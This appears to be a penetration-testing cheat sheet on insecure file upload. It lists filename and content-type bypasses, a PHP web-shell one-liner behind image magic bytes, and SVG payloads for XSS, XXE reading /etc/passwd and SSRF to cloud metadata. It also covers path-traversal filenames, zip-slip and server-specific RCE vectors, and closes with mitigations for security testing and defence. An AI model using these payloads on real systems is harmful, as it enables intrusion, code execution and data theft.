# Insecure File Upload

> File-upload features become dangerous when validation is incomplete: an uploaded file can lead to XSS, SSRF, RCE, or denial of service depending on what the server does with it.

## Summary

- [Validation Layers](#validation-layers)
- [Extension Bypass](#extension-bypass)
- [Content-Type Bypass](#content-type-bypass)
- [Magic-Byte Bypass](#magic-byte-bypass)
- [Polyglot Files](#polyglot-files)
- [Image Re-Encoding Bypass](#image-re-encoding-bypass)
- [SVG Tricks](#svg-tricks)
- [Path Traversal in Filename](#path-traversal-in-filename)
- [Zip-Slip / Tar-Slip](#zip-slip--tar-slip)
- [Server-Specific RCE Vectors](#server-specific-rce-vectors)
- [Mitigation](#mitigation)
- [References](#references)

## Validation Layers

A typical upload validates:

1. **Extension** (`.jpg`, `.png` only)
2. **Content-Type** header (`image/png`)
3. **Magic bytes** (first few bytes of file)
4. **Re-encoding** (decode → re-encode through GD/ImageMagick)
5. **Filename** sanitization
6. **Storage location & served Content-Type**
7. **Execution permissions** (no `.php` execution under upload dir)

Find the weakest layer and bypass it.

## Extension Bypass

```
shell.php
shell.PHP
shell.pHp
shell.phtml
shell.phar
shell.pht
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtm
shell.inc
shell.jpg.php
shell.php.jpg
shell.php%00.jpg
shell.php\x00.jpg
shell.php;.jpg
shell.php:.jpg
shell.php#.jpg
shell.php/.jpg
shell.php.jpg/
shell.aspx;.jpg
shell.asp;.jpg
shell.asp::$DATA
shell.jsp
shell.jspx
shell.war
.htaccess
```

Apache `.htaccess` to enable PHP execution from another extension:

```
AddType application/x-httpd-php .jpg
```

If `.htaccess` upload is filtered, try:

```
.htaccess.
HTACCESS
.htaccess%20
```

Nginx legacy: `shell.jpg/x.php` is executed as PHP when `cgi.fix_pathinfo=1`.

## Content-Type Bypass

Modify the multipart's `Content-Type` header:

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png
```

Or vice versa: keep extension `.jpg` but content-type `application/x-php` if the server uses content-type to pick handler.

## Magic-Byte Bypass

Prepend a valid header:

```
GIF89a;<?php system($_GET['c']); ?>
```

```
\xff\xd8\xff\xe0...<?php system($_GET['c']); ?>     (JPEG SOI)
\x89PNG\r\n\x1a\n...<?php system($_GET['c']); ?>    (PNG)
```

ImageMagick / `getimagesize()` will say "valid image" even though PHP also parses the embedded code.

## Polyglot Files

Files valid as two formats at once. Most useful:

- **GIF + JS**: GIF that's also valid JavaScript — bypasses `Content-Type: image/gif` XSS protections.
- **PDF + JS**: bypass certain content sniffing.
- **JPEG + HTML**: stored XSS via image upload when server-sniffing is `text/html`.

Famous example — [Ange Albertini's Corkami repository](https://github.com/corkami/pocs).

## Image Re-Encoding Bypass

When server re-encodes via GD / Imagick:

- Embed payload in **EXIF** fields if the re-encoder preserves metadata.
- Use **PLTE / tEXt / iCCP** chunks in PNG.
- Hide payload after the IEND chunk (some parsers don't strip).
- Use **JPEG comment** (`COM` marker) which survives some re-encoders.

For Imagick specifically, see [ImageTragick](https://imagetragick.com/) (CVE-2016-3714).

## SVG Tricks

SVG is XML → many attack surfaces:

### XSS

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```

### XXE

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&x;</text></svg>
```

### SSRF

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

### Billion Laughs DoS

See [../XXE Injection/](../XXE%20Injection/) for the payload.

## Path Traversal in Filename

```
filename="../../../../var/www/html/shell.php"
filename="..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php"
filename="\\..\\..\\..\\windows\\temp\\shell.aspx"
filename="C:\\inetpub\\wwwroot\\shell.aspx"
filename=":hidden.txt"           NTFS stream
```

Affects servers that use the client-supplied filename as a path.

## Zip-Slip / Tar-Slip

A ZIP/TAR entry with `../../../etc/cron.d/x` in its filename. When extracted naïvely, the file is written outside the target directory.

```
$ unzip -l evil.zip
   100  ../../../etc/cron.d/pwn
```

Affects: Java's `ZipFile` (pre-fix), `apache-commons-compress`, many language stdlibs unless explicitly defended.

## Server-Specific RCE Vectors

### PHP

- Upload `.phtml`, `.phar`, `.inc`, etc.
- `.htaccess` to remap extensions.
- LFI + uploaded image → log poisoning / phar deserialization.

### ASP.NET / IIS

- `shell.aspx`, `shell.ashx`, `shell.asmx`.
- `web.config` upload to register a new handler.
- Trailing chars: `shell.aspx.`, `shell.aspx;.jpg`, `shell.aspx::$DATA`.

### Java / Tomcat

- WAR file upload to `webapps/` → instant deploy.
- JSP upload + access to JSP directory.

### Node / Express

- Upload to a path served by `express.static()` with no MIME enforcement → JS execution in browser via XSS.

### nginx alias misconfig

```
location /static {
  alias /var/www/uploads;
}
```

`GET /static../etc/passwd` resolves to `/var/www/etc/passwd` — combine with upload to plant arbitrary files.

## Mitigation

- **Allow-list** extensions and MIME types. Don't block-list.
- Re-encode all images server-side; reject if re-encoding fails.
- Store uploads **outside the document root**, or on object storage (S3 etc.).
- Serve via a separate, non-executing domain or with explicit `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
- Generate **server-side filenames** (UUIDs) — never use client-supplied names.
- Disable script execution in the upload directory (`<FilesMatch ...>` in Apache, removing handlers in IIS).
- For archive extraction, validate each entry's destination is under the target dir.

## References

- [OWASP — File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
